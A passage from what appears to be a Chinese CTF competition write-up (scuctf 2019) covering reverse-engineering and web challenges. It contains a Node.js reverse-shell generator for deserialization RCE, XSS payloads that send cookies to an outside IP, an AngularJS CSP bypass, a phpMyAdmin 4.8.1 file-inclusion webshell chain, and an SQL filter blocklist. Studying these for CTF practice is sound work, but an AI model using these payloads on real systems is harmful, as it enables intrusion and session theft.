hex , result )) result [ 0 ] = ( result [ 0 ] ^ data [ i - 1 ]) & 0xffffffff result [ 1 ] += ( result [ 0 ] & 0xff000000 ) >> 24 result [ 0 ] = ( result [ 0 ] << 8 ) & 0xffffffff print ( map ( lambda x : hex ( data [ x ]), blks )) for n in num : origin = [ 0x424fa357 , 0x3f6a6fab ] ind = [] number = '' for i in range ( len ( blks ) + 1 ): if i == 0 : v14 = origin [ 0 ] ^ ord ( n ) index = 2 * ( v14 & 0xff ) number += n else : index = blks [ len ( blks ) - i ] - 1 number += ( chr (( origin [ 0 ] ^ ( index / 2 )) & 0xff )) origin [ 0 ] = ( origin [ 0 ] >> 8 ) + (( origin [ 1 ] & 0xff ) << 24 ) origin [ 1 ] >>= 8 origin [ 0 ] ^= data [ index ] origin [ 1 ] ^= data [ index + 1 ] print ( 'n=' , n , ' i=' , i , map ( hex , origin ), number ) print ( map ( hex , origin )) \u53ef\u4ee5\u770b\u5230 201914153 \u662f\u7b26\u5408\u6761\u4ef6\u7684\u8f93\u5165 \u968f\u540e flag \u5373\u4e3a scuctf{b@sE2019_scucs_201914153}","title":"baha(dondayoo~\u6218\u961f wp)"},{"location":"201905/Web/","text":"Web \u00b6 \u4f60\u597d\u5440 \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 NodeJS \u53cd\u5e8f\u5217\u5316 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6253\u5f00\u9898\u76ee\uff0cF12 \u67e5\u770b\u6e90\u7801\uff0c\u5728\u6ce8\u91ca\u4e2d\u53ef\u4ee5\u53d1\u73b0\u5728 /app.js.bak \u5904\u53ef\u4ee5\u67e5\u770b\u6e90\u7801\u3002 \u67e5\u770b\u6e90\u7801\u4e4b\u540e\uff0c\u53d1\u73b0\u4e00\u5904\u53cd\u5e8f\u5217\u5316\uff0c\u8003\u8651\u4f7f\u7528\u53cd\u5e8f\u5217\u5316\u6765\u8fdb\u884c\u4ee3\u7801\u6267\u884c\u3002 \u7531\u4e8e NodeJS \u7684\u4ee3\u7801\u6267\u884c\u5728\u540e\u7aef\u6267\u884c\uff0c\u6ca1\u6709\u56de\u663e\uff0c\u6b64\u5904\u6709\u51e0\u79cd\u5e38\u89c1\u65b9\u5f0f\u83b7\u5f97\u56de\u663e\uff1aDNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\uff0c\u53cd\u5411 Shell\uff08\u7531\u4e8e docker \u53ea\u5f00\u653e\u4e86\u4e00\u4e2a\u7aef\u53e3\uff0c\u65e0\u6cd5\u4f7f\u7528\u6b63\u5411 Shell\uff09\u3002 DNS \u89e3\u6790\uff0cHTTP \u8bf7\u6c42\u7684\u5229\u7528\u65b9\u6cd5\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\uff0c\u6b64\u5904\u5c55\u793a\u4f7f\u7528\u53cd\u5411 shell \u7684\u65b9\u6cd5\u3002\u9996\u5148\uff0c\u9700\u8981\u751f\u6210\u4e00\u4e2a nodejs \u7684\u53cd\u5411 shell\uff0c\u811a\u672c\u5982\u4e0b\uff1a import sys if len ( sys . argv ) != 3 : print \"Usage: %s <LHOST> <LPORT>\" % ( sys . argv [ 0 ]) sys . exit ( 0 ) IP_ADDR = sys . argv [ 1 ] PORT = sys . argv [ 2 ] def charencode ( string ): \"\"\"String.CharCode\"\"\" encoded = '' for char in string : encoded = encoded + \",\" + str ( ord ( char )) return encoded [ 1 :] print \"[+] LHOST = %s \" % ( IP_ADDR ) print \"[+] LPORT = %s \" % ( PORT ) NODEJS_REV_SHELL = ''' var net = require('net'); var spawn = require('child_process').spawn; HOST=\" %s \"; PORT=\" %s \"; TIMEOUT=\"5000\"; if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; } function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected! \\\\ n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected! \\\\ n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); }); } c(HOST,PORT); ''' % ( IP_ADDR , PORT ) print \"[+] Encoding\" PAYLOAD = charencode ( NODEJS_REV_SHELL ) print \"eval(String.fromCharCode( %s ))\" % ( PAYLOAD ) \u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a\u53cd\u5411 shell\uff0c\u7136\u540e\u53ea\u9700\u8981\u5c06\u8fd9\u4e2a\u53cd\u5411 shell \u653e\u5230 cookie \u91cc\u3002\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61 y={rce : function (){}} ,\u5c06\u4e0a\u9762\u7684\u7a0b\u5e8f\u751f\u6210\u7684\u4ee3\u7801\u7c98\u8d34\u5230\u82b1\u62ec\u53f7\u4e2d\uff0c\u4f7f\u7528 serialize \u65b9\u6cd5\u5bf9\u5176\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u5f97\u5230\u7684\u4ee3\u7801\u5728\u51fd\u6570\u540e\u52a0\u4e0a\u5706\u62ec\u53f7\uff0c\u4f7f\u5176\u80fd\u81ea\u52a8\u6267\u884c\u3002\u6548\u679c\u5982\u4e0b\uff1a \u4e09\u9053 XSS \u603b\u62ec \u00b6 \u6b64\u6b21\u6bd4\u8d5b\u7684\u4e09\u9053 XSS \u662f\u672c\u7740\u4e0d\u51fa\u8111\u6d1e\u7684\u60f3\u6cd5\u51fa\u7684\uff0c\u9898\u76ee\u672c\u8eab\u6ca1\u6709\u7ed5\u592a\u591a\u5708\u5708\uff0c\u4f46\u662f\u5728\u6bd4\u8d5b\u73af\u5883\u4e0b\u6ca1\u6709\u8003\u8651\u5230\u8d44\u6e90\u5360\u7528\u8fc7\u591a\u548c\u50f5\u5c38\u7a0b\u5e8f\u7684\u60c5\u51b5\uff0c\u5bfc\u81f4\u7f51\u9875\u5de8\u5361\u65e0\u6bd4\u548c\u4e0d\u80fd\u6253\u51fa flag \u7684\u73b0\u8c61\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u51fa\u9898\u65f6\u5404\u51fa\u9898\u4eba\u6ca1\u6709\u534f\u5546 flag \u683c\u5f0f\u7684\u95ee\u9898\uff0c\u6211\u5f55\u5165 docker \u7684\u65f6\u5019 flag \u683c\u5f0f\u5c31\u4e3a fl4g{} \uff0c\u6700\u540e\u4e0a\u9898\u7684\u65f6\u5019\u53c8\u8981\u6c42 scuctf{} \uff0c\u53ef\u80fd\u5751\u4e86\u4e00\u4e9b\u4eba\uff0c\u505a\u9898\u4f53\u9a8c\u5e76\u4e0d\u597d\uff0c\u5728\u8fd9\u91cc\u8868\u793a\u62b1\u6b49 \u4e09\u9053\u9898\u90fd\u662f\u540c\u4e00\u4e2a\u63d0\u4ea4\u5e73\u53f0\uff0c\u4f7f\u7528\u5b50\u8def\u5f84\u4f5c\u4e3a\u9650\u5236(\u63a8\u8350\u9605\u8bfb\uff1a https://www.cnblogs.com/fsjohnhuang/archive/2011/11/22/2258999.html )\uff0c\u4ee5\u8fbe\u5230\u4e09\u9898\u5206\u79bb\u4f46\u662f\u53c8\u4f7f\u7528\u540c\u4e00\u4e2a bot \u7684\u6548\u679c\u3002\u5176\u5b9e\u5728\u8fd9\u91cc\u6211\u8fd8\u662f\u633a\u6015\u51fa\u73b0\u7b80\u5355\u9898\u6253\u5230\u56f0\u96be\u9898\u7684 flag \u7684\u975e\u9884\u671f\u89e3\uff08\u867d\u7136\u5fc3\u7406\u4e0a\u8fd8\u662f\u6bd4\u8f83\u80af\u5b9a\u4e0d\u4f1a\u51fa\u8fd9\u79cd\u60c5\u51b5 XD\uff09 \u6240\u4ee5\uff0c \u4e09\u9053\u9898\u90fd\u662f\u5c06\u5305\u542b\u6253 cookie payload \u7684 url \u4ea4\u7ed9\u63d0\u4ea4\u5e73\u53f0\uff0c\u5e73\u53f0 robot \u4f7f\u7528 firefox \u53bb\u8bbf\u95ee\u4f60\u63d0\u4ea4\u7684 url\uff0c\u4ece\u800c\u83b7\u53d6\u5230\u5728 cookie \u91cc\u7684 flag \u5410\u69fd\uff1axss bot \u771f\u7684\u5751\uff0c\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\u6765\u8c03 bot\uff0c\u7ed3\u679c\u6bd4\u8d5b\u7684\u65f6\u5019\u8fd8\u662f\u51fa\u95ee\u9898\u3002\u3002\u3002\u679c\u7136\u662f\u4ece\u5165\u5751\u5230\u653e\u5f03:) \u63d0\u4ea4\u5e73\u53f0\u622a\u56fe\uff1a \u7b80\u5355\u7684 XSS \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 XSS \u57fa\u672c\u6982\u5ff5 XSS \u83b7\u53d6 cookie \u89e3\u9898\u8fc7\u7a0b \u00b6 \u8bd5\u63a2\u548c\u5f39\u7a97 \u00b6 \u672c\u9898\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u76f4\u63a5\u8f93\u51fa\u4f20\u5165\u503c\uff0c\u5178\u578b\u7684 XSS \u5165\u95e8\u540e\u53f0\u4ee3\u7801\u3002 \u9996\u5148\uff0c\u770b\u5230\u7f51\u9875\u5c06\u4f20\u5165\u7684\u53c2\u6570\u539f\u6837\u8fd4\u56de\uff1a \u8f93\u5165\u7b80\u5355\u7684\u5f39\u7a97 payload: ?greet=<script>alert(document.domain)</script> \u76f4\u63a5\u5f39\u51fa domain\uff0c\u53ef\u89c1\u6b64\u5904\u6709 XSS \u6f0f\u6d1e\uff1a \u83b7\u53d6 flag \u00b6 \u9996\u5148\uff0c\u5c1d\u8bd5\u5c06\u81ea\u5df1\u7684 cookie \u6253\u5230 xss \u5e73\u53f0\u4e0a\u3002 \u76f4\u63a5\u586b\u5165 payload: ?greet=%3Cimg/src=x%20onerror=%22a=%27http://120.78.185.175/xss/myxss?s=%27%2Bdocument.cookie;new%20Image().src=a%22%3E \uff0c\u8bbf\u95ee\uff1a \u770b\u5230\u6210\u529f\u6253\u51fa cookie\uff1a \u5c06 payload \u8f93\u5165\u63d0\u4ea4\u9875\u9762\u83b7\u53d6 flag\uff1a \u6ce8\u610f\u8981\u5f39\u51fa\u4ee5\u4e0b\u7a97\u53e3\u624d\u8bf4\u660e bot \u6210\u529f\u8bbf\u95ee\u4e86 url\uff1a \u67e5\u770b XSS \u5e73\u53f0\u53ef\u4ee5\u770b\u5230\u6210\u529f\u6253\u5230\u7684 flag\uff1a \u7a0d\u96be\u4e00\u70b9\u7684 XSS \u00b6 \u672c\u9898\u7075\u611f\u6765\u6e90\u4e8e\u4e00\u7bc7\u6f0f\u6d1e\u60ac\u8d4f\u7684\u5b9e\u6218 blog\uff0c\u6211\u8bb0\u4e0d\u5230\u5177\u4f53\u51fa\u5904\u4e86\uff0c\u5c31\u63a8\u8350\u4e00\u4e2a \u7f51\u7ad9 \u5427 \u8003\u5bdf\u8981\u70b9 \u00b6 CSP DOM XSS\uff08Script Gadgets\uff09 \u7ed5\u8fc7 CSP Angularjs \u89e3\u9898\u8fc7\u7a0b \u00b6 \u672c\u9898\u5728\u7ed9\u51fa hint \u4e4b\u540e\u96be\u5ea6\u964d\u4f4e\u4e86\uff0c\u987a\u7740\u601d\u8def\u8d70\u5c31\u884c\u3002 \u8bd5\u63a2\u548c\u5f39\u7a97 \u00b6 \u8fd8\u662f\u67e5\u770b\u7f51\u9875\uff0c\u53d1\u73b0\u8fd9\u56de\u6709 CSP \u7b56\u7565\u4e86\uff0c\u5176\u4e2d\u6709\u4e2a\u70b9\u503c\u5f97\u6ce8\u610f\uff1aCSP \u5bf9 sina \u67d0\u57df\u4e0b\u653e\u884c: *.sinaapp.com \uff1a \u8fd9\u4e2a\u57df\u4e0b\u6709\u5565\u597d\u4e1c\u897f\u5462\uff0c\u8fd9\u4e2a\u57df\u4e0b\u6709 lib.sinaapp.com \u662f\u4e2a CDN\uff0c\u53ef\u4ee5\u76f4\u63a5\u5f15\u5165 JS \u5e93\u3002\u4e8e\u662f\u5c31\u60f3\u8d77 17 \u5e74 blackhat \u4e0a\u7684\u6f14\u8bb2\uff1a Script Gadgets \u5728\u8be5\u57df\u4e0b\u627e\u5230\u6709 angularjs \u7684\u5e93\uff0c\u5e76\u4e14\u5b58\u5728\u8001\u7248\u672c\u7684\u5e93: \u8001\u7248\u672c\u7684\u5e93\u6ca1\u6709\u5b89\u5168\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u8fbe\u5230\u7ed5\u8fc7 CSP \u7684\u6548\u679c\uff0cpayload \u4e3a\uff1a <div ng-app> {{constructor.constructor('alert(document.domain)')()}} </div> \u6784\u9020\u5f39\u7a97 payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php??guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"alert(document.domain)\")()}}%3C/div%3E \u6210\u529f\u5f39\u7a97\uff1a \u83b7\u53d6 flag \u00b6 \u90fd\u5df2\u7ecf\u5f39\u7a97\u4e86\uff0c\u63a5\u4e0b\u6765\u5c31\u597d\u529e\u4e86\uff0c\u7c7b\u4f3c\u7b2c\u4e00\u9898\uff0c\u76f4\u63a5\u4e0a payload\uff1a http://120.78.185.175:5000/hachp1/wuziqi/index.php?guest_name=%3Cscript%20src=http://lib.sinaapp.com/js/angular.js/angular-1.0.6/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E{{constructor.constructor(\"document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;\")()}}%3C/div%3E \u62ff\u5230 flag\uff1a \u66f4\u96be\u7684 XSS \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u539f\u6709\u7684 script \u6807\u7b7e\u53ef\u88ab\u4e4b\u524d\u63d2\u5165\u7684 <script> \u7834\u574f \u6807\u7b7e name \u53ef\u4ee5\u901a\u8fc7 js \u76f4\u63a5\u6210\u4e3a\u53d8\u91cf\u4ece\u800c\u8986\u76d6\u53d8\u91cf \u641c\u539f\u9898\u7684\u80fd\u529b:) \u539f\u9898 WP \u00b6 \u672c\u9898\u6765\u6e90\u4e8e TCTF2018 \u7684 bl0g \u9898 \u539f\u9898 WP \u63a8\u8350 https://lorexxar.cn/2018/04/05/0ctf2018-blog/ \u89e3\u9898\u8fc7\u7a0b \u00b6 \u8bd5\u63a2\u548c\u5f39\u7a97 \u00b6 \u8fdb\u5165\u7f51\u9875\uff0c\u8fd8\u662f CSP\uff0c\u4f46\u662f\u66f4\u4e25\u683c\u4e86\uff1a \u66f4\u6539 payload\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53ef\u4ee5\u770b\u5230\u53c2\u6570\u8f93\u51fa\u7684\u4e24\u4e2a\u4f4d\u7f6e\uff1a \u9875\u9762\u4e2d\u7684 JS \u4ee3\u7801\u8fd0\u884c\u8fc7\u7a0b\u5206\u6790\u4e00\u4e0b\uff0c\u6700\u540e\u4e00\u6bb5\u6e90\u7801\u5c06\u7b2c\u4e00\u6bb5\u6e90\u7801\u4e2d\u51fa\u73b0\u7684\u8fde\u63a5 append \u5230\u7f51\u9875\u540e\uff1a \u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u53ef\u63a7\u70b9\u4e00\u4e2a\u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u524d\uff0c\u4e00\u4e2a\u5219\u76f4\u63a5\u51b3\u5b9a\u4e86 name_links \u7684\u7d22\u5f15\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7b2c\u4e00\u4e2a\u53ef\u63a7\u70b9\u7834\u574f\u7b2c\u4e00\u6bb5\u4ee3\u7801\uff0c\u7b2c\u4e8c\u6bb5\u4ee3\u7801\u6784\u9020 name \u4e3a name_links \u7684 form \u6807\u7b7e\uff0c\u5e76\u76f4\u63a5\u901a\u8fc7 name_links \u83b7\u53d6\u6211\u4eec\u6784\u9020\u7684\u6807\u7b7e\u7684 id \u503c\uff0c\u5e76\u628a\u503c\u8f93\u51fa\u5728\u9875\u9762\u4e0a\uff1b\u6b64\u65f6\uff0c\u5c31\u53ef\u4ee5\u5c06\u6076\u610f payload \u6ce8\u5165\u7f51\u9875\u3002\uff08\u53ef\u80fd\u903b\u8f91\u6709\u70b9\u6655\uff0c\u5efa\u8bae\u5bf9\u7167 TCTF \u539f\u9898 WP \u4e00\u8d77\u7406\u89e3\uff09 \u6700\u540e\uff0c\u5f39\u7a97 payload \u5982\u4e0b\uff08\u9700\u8981\u6ce8\u610f\u7684\u4e24\u70b9\u662f\uff0c1. \u53ea\u6709\u6807\u7b7e\u539f\u6709\u7684\u5c5e\u6027\u540d\u624d\u80fd\u6210\u529f\u83b7\u53d6\u5230\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f7f\u7528\u7684\u662f id \u6765\u83b7\u53d6\uff1b2. \u5728\u8fd9\u91cc\u6211\u8fc7\u6ee4\u4e86\u9664 form \u5916\u7684\u5176\u4ed6\u6807\u7b7e\uff0c\u6240\u4ee5\u9700\u8981\u5148\u95ed\u5408\u524d\u9762\u7684 form \u6807\u7b7e\uff0c\u539f\u9898\u7684 WP \u4e0d\u80fd\u76f4\u63a5\u7528\uff09\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=%22%3E%3Cscript%3E&ft_id=id%22%3E%3C/form%3E%3CForm+name%3Dname_links+id%3D%22%3Cscript%3Ealert(document.domain);%3C%2Fscript%3E%22%3E \u5f39\u7a97\u5982\u4e0b\uff1a \u83b7\u53d6 flag \u00b6 \u540c\u7b2c\u4e8c\u9898\uff0c\u90fd\u5f39\u7a97\u4e86\uff0c\u5269\u4e0b\u7684\u4e0d\u7528\u8bf4\u4e86\uff0c\u6253 flag\uff1a http://120.78.185.175:5000/hachp1/pintu/index.php?name=\"><script>&ft_id=id\"></form><Form+name%3Dname_links+id%3D\"<script>document.location='http://120.78.185.175/xss/myxss?c='%2Bdocument.cookie;<%2Fscript>\"> flag: \u51fa\u9898\u4eba\u5bc4\u8bed \u00b6 \u6700\u540e\uff0c\u795d\u8d3a\u5728\u6bd4\u8d5b\u4e2d\u6253\u51fa\u4e09\u9053\u9898\u7684\u5927\u4f6c XD\uff0c\u4e5f\u5e0c\u671b\u6ca1\u6709\u6253\u51fa\u6765\u7684\u540c\u5b66\u4eec\u80fd\u5b66\u5230\u4e00\u4e9b\u4e1c\u897f\uff0c\u8fd9\u6837\u8fd9\u4e09\u9898\u7684\u4f7f\u547d\u5c31\u5b8c\u6210\u4e86\u3002 \u827e\u8fea\u9b54\u529b\u8f6c\u5708\u5708 \u00b6 \u8fd9\u9053\u9898\u522b\u770b 400 \u591a\u5206\u5728 Web \u9898\u91cc\u5206\u662f\u6700\u9ad8\u7684\uff0c\u5176\u5b9e\u8fd9\u4e5f\u7b97\u4e00\u9053\u9001\u5206\u9898\uff0c\u5b9e\u9645\u96be\u5ea6\u5927\u6982 150 \u5206\u5de6\u53f3 \u5230\u6700\u540e\u53ea\u6709\u56db\u4e94\u4e2a\u961f\u4f0d\u505a\u51fa\u6765\uff0c\u8fd8\u662f\u6709\u4e9b\u611f\u6168 \u9898\u76ee\u63d0\u793a\u4e86\u7528\u6237\u540d\u662f scuctf\uff0c\u5bc6\u7801\u6ca1\u7ed9\uff0c\u8fd9\u79cd\u60c5\u51b5\u90fd\u662f\u5f31\u53e3\u4ee4\uff0c\u76f4\u63a5 BurpSuite \u7206\u7834\u4e00\u4e0b 123456 \u5c31\u51fa\u6765\u4e86 \u8fdb\u53bb\u770b\u5230 PhpMyAdmin\uff0c\u6ca1\u6709\u5168\u5c40\u6743\u9650\uff0c\u90a3\u5c31\u4e0d\u53ef\u4ee5\u5199\u6587\u4ef6\u4e4b\u7c7b\u7684\uff0c\u53f3\u8fb9\u770b\u5230 PhpMyAdmin \u7248\u672c\u4e3a 4.8.1 \u7136\u540e\u641c\u4e00\u4e0b\u8fd9\u4e2a\u7248\u672c\u7684\u6f0f\u6d1e\uff0c\u53d1\u73b0\u4e00\u4e2a\u540e\u53f0 getshell \u7684\u6f0f\u6d1e https://www.cnblogs.com/fox-yu/p/9209203.html \u76f4\u63a5\u4e0a\u6700\u7b80\u5355\u7684\u505a\u6cd5\uff0c\u8fd8\u6709\u4e00\u4e2a\u5199\u5165\u8868\u5185\u5305\u542b\u8868\u6587\u4ef6\u7684\u505a\u6cd5\u81ea\u5df1\u627e\u627e\u54c8\uff0c\u539f\u7406\u4e00\u6837~ select '<?php @eval($_GET[1]);?>' ; \u7136\u540e\u5305\u542b\u4e00\u4e0b sess_cookie \u6587\u4ef6 index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie) cookie \u662f phpMyAdmin \u7684\u503c \u7136\u540e index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('ls /'); index.php?target=db_sql.php%3f/../../../../../../../../var/lib/php/sessions/sess_(\u4f60\u7684cookie)&1=system('cat /fl444444g'); \u8fd9\u9053\u9898\u5230\u6b64\u4e3a\u6b62~ \u6765\u4e86\u8001\u5f1f \u00b6 \u8fd9\u9053\u9898\u4e00\u5f00\u59cb\u662f\u6ca1\u4eba\u505a\u51fa\u6765\u7684\uff0c\u4f46\u53ea\u6709 80 \u5206\u7684\u9898\u561b\uff0c\u80fd\u96be\u5012\u90a3\u91cc\u53bb\u5462\uff1f \u8fd9\u91cc\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u5730\u5740\uff08\u4fe9\u5730\u5740\u4e00\u6837\uff09 \u7ed9\u7684\u5730\u5740\u53ea\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u4e4b\u540e\u5c31\u4e00\u4e2a\u8170\u5b50\u59d0\u548c PDD\uff0c\u4f46\u662f\u4f60\u4eec\u4ed4\u7ec6\u89c2\u5bdf UR \u91cc\u7684\u53d8\u5316\u4e86\u561b\uff1f \u4f60\u8f93\u5165\u7684\u662f http://47.96.138.65:45787/didi \u8fdb\u53bb\u53d8\u6210\u4e86 http://47.96.138.65:45787/didi/secret.php apache \u9ed8\u8ba4\u7684\u5165\u53e3\u6587\u4ef6\u662f index.php \u4ed6\u5374\u662f\u51fa\u73b0\u7684 secret.php\uff0c\u8fd9\u4e0d\u662f\u6709\u95ee\u9898\u561b F12 \u4e00\u4e0b\u770b\u5230 index.php \u88ab 302 \u8df3\u8f6c\u4e86\uff0c\u5e76\u4e14 flag \u5c31\u5728\u4e0b\u9762\u7684 Set-Cookie \u4e2d\uff0c\u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86 cookie \u751f\u6548\u65f6\u95f4\u4e3a 0.01 \u79d2\uff0c\u4e14\u53ea\u5bb9\u8bb8\u5bf9 index.php \u751f\u6548\uff0c\u6240\u4ee5\u5728\u5176\u4ed6\u7f51\u9875\u91cc\u662f\u770b\u4e0d\u5230\u7684 \u76f4\u63a5\u628a flag \u7684\u503c base64 \u89e3\u7801\u4e00\u4e0b\u5c31\u51fa\u6765 flag \u4e86 \u505a\u9898\u8fc7\u7a0b\u4e2d\u770b\u5230\u6709\u7684\u540c\u5b66\u76f4\u63a5 scuctf{U0NVQ1RGe3kwVV9qVXM3X25lRWRfY2FyM2Z1bH0%3D} \u63d0\u4ea4\u4e86\u4e0a\u6765\uff0c\u5176\u5b9e\u5c31\u5dee\u6700\u540e\u4e00\u6b65\u4e86\uff0c\u6709\u70b9\u53ef\u60dc~ \u6240\u4ee5\u8fd9\u9053\u9898\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u5c31\u8003\u4e2a\u7b80\u5355\u7684\u6293\u5305\u548c\u770b\u4f60\u7ec6\u5fc3\u7a0b\u5ea6\uff0cOK \u4e0b\u4e00\u9053~ BabySqli \u00b6 \u8fd9\u91cc\u653e\u4e0a\u6e90\u4ee3\u7801 config.php <?php error_reporting ( 0 ); $servername = \"localhost\" ; $username = \"root\" ; $password = \"**********************\" ; $dbname = \"scuctf\" ; function stop_hack ( $value ){ $pattern = \"insert|delete|bool|extractvalue|rand|group|geometrycollection|multipoint|multipolygon|regexp|linestring|multilinestring|name_const|right|char|benchmark|polygon|char|rlike|concat|rpad|repeat|sleep|ascii|innodb|and|if|exp|updatexml|left|pow|concat_ws|group_concat|substr|join|floor|\\.\\.\\/|\\.\\/|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system| |eval\" ; $back_list = explode ( \"|\" , $pattern ); foreach ( $back_list as $hack ){ if ( preg_match ( \"/ $hack /i\" , $value )) die ( \" $hack detected!Do not want to get flag!!<br>\" ); } return $value ; } ?> index.php <?php include 'config.php' ; error_reporting ( 0 ); $conn = new mysqli ( $servername , $username , $password , $dbname ); if ( $conn -> connect_error ) { die ( \"\u8fde\u63a5\u5931\u8d25: \" ); } $sql = \"SELECT COUNT(*) FROM users\" ; $whitelist = array (); $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); $whitelist = range ( 1 , $row [ 'COUNT(*)' ]); } if ( ! empty ( $_GET [ 'id' ])){ $id = stop_hack ( $_GET [ 'id' ]); $sql = \"SELECT * FROM users WHERE id= $id \" ; if ( ! in_array ( $id , $whitelist )) { die ( \"id $id is not in whitelist.\" ); } $result = $conn -> query ( $sql ); if ( $result -> num_rows > 0 ){ $row = $result -> fetch_assoc (); foreach ( $row as $key => $value ) { if ( preg_match ( \"/scuctf{.+?}/i\" , $value )){ die ( \"scuctf is found!!\" ); } } echo \"<center><table border='5'>\" ; foreach ( $row as $key => $value ) { echo \"<tr><td><center> $key </center></td><br>\" ; echo \"<td><center> $value </center></td></tr><br>\" ; } echo \"</table></center>\" ; } else { echo \"what do you want do??\" ; } } else { echo \"Please input id!\" ; } ?> \u5efa\u8868 sql \u6587\u4ef6 create database scuctf ; use scuctf ; create table users ( id int ( 6 ) unsigned auto_increment primary key , name varchar ( 20 ) not null , email varchar ( 30 ) not null , salary int ( 8 ) unsigned not null ); INSERT INTO users VALUES ( 1 , 'GodHuang' , 'GodHuang@scuctf.com' , 3000 ); INSERT INTO users VALUES ( 2 , 'GodSun' , 'GodSun@scuctf.com' , 4500 ); INSERT INTO users VALUES ( 3 , 'CaiJiWo' , 'CaiJiWo@scuctf.com' , 2700 ); INSERT INTO users VALUES ( 4 , 'GodWu' , 'GodWu@scuctf.com' , 10000 ); INSERT INTO users VALUES ( 5 , 'GodPang' , 'GodPang@scuctf.com' , 6000 ); create table flag ( guess varchar ( 20 ) not null , fffffffl11lgg varchar ( 30 ) not null , secert varchar ( 30 ) not null , flag varchar ( 30 ) not null ); INSERT INTO flag VALUES ( 'what happened?' , 'scuctf{3q1i_i3_t0o_e43y}' , 'I can not tell you!' , 'I am not flag Hhhhhhh!!' ); \u8fc7\u6ee4\u5982\u4e0b\uff1a $pattern =\" insert|delete|bool|extractvalue| rand|group|geometrycollection|multipoint| multipolygon|regexp|linestring| multilinestring|name_const|right|char| benchmark|polygon|char|rlike|concat|rpad| repeat|sleep|ascii|innodb|and|if|exp| updatexml|left|pow|concat_ws|group_concat| substr|join|floor|\\.\\.\\/|\\.\\/|into| load_file|outfile|dumpfile|sub|hex| file_put_contents|fwrite|curl|system| | eval\"; \u8fd9\u9053\u9898\u6211\u51fa\u9898\u7684\u65f6\u5019\uff0c\u53c2\u8003\u4e86\u5f88\u591a\u5927\u725b\u7684\u535a\u5ba2\u6587\u7ae0\uff0c\u5173\u95ed\u4e86\u62a5\u9519\u63d0\u793a\u548c\u7edd\u5927\u90e8\u5206\u65f6\u95f4\u76f2\u6ce8\u51fd\u6570(\u53ef\u80fd\u6709\u9057\u6f0f\u7684) \u4f46\u6211\u5374\u7559\u4e0b\u4e86 get_lock()\u51fd\u6570 \u9898\u76ee\u4e0a\u7ebf\u524d\uff0c\u6211\u628a or \u548c and \u6b63\u5219\u5339\u914d\u8fc7\u6ee4\u4e86\uff0c\u5bfc\u81f4\u4e0d\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 information \u6765\u67e5\u8be2\u8868\u548c\u5b57\u6bb5\u540d \u4f46\u4e0a\u7ebf\u540e\u51fa\u4e86\u70b9\u95ee\u9898\uff0cor \u548c and \u5b9e\u9645\u4e0a\u6ca1\u6709\u8fc7\u6ee4\u6389\uff08\u8fd9\u662f\u7b2c\u4e8c\u5929\u624d\u53d1\u73b0\u7684\uff09\uff0c\u5e76\u4e14\u6700\u91cd\u8981\u7684\u662f\u6ca1\u6709\u5168\u5b57\u5339\u914d\uff0c\u5bfc\u81f4\u53ef\u4ee5\u76f4\u63a5 select * from flag \u5168\u67e5\u51fa\u6765\uff01\u4e8e\u662f\u8d76\u7d27\u4e0b\u7ebf\uff0c\u52a0\u5165\u4e86\u6b63\u5219\u5339\u914d foreach ($row as $key => $value) { if(preg_match(\"/scuctf{.+?}/i\",$value)){ die(\"scuctf is found!!\"); } } \u4e0d\u53ef\u4ee5\u5f53\u524d\u9875\u9762\u76f4\u63a5\u6ce8\u5165\u51fa\u6765 scuctf{}\u6574\u4e2a\u5b57\u6bb5\u4e86\uff0c\u53ea\u80fd\u76f2\u6ce8\u4e00\u4e2a\u4e2a\u8dd1\u4e86 \u6240\u4ee5\u6211\u7684\u6574\u4f53\u601d\u8def\u662f\uff0c\u901a\u8fc7\u5b50\u67e5\u8be2\u6765\u4e0d\u77e5\u5b57\u6bb5\u540d\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97 fffffffl11lgg \u7684\u503c \u8868\u540d\u5f97\u81ea\u5df1\u731c\uff0c\u4f46 CTF 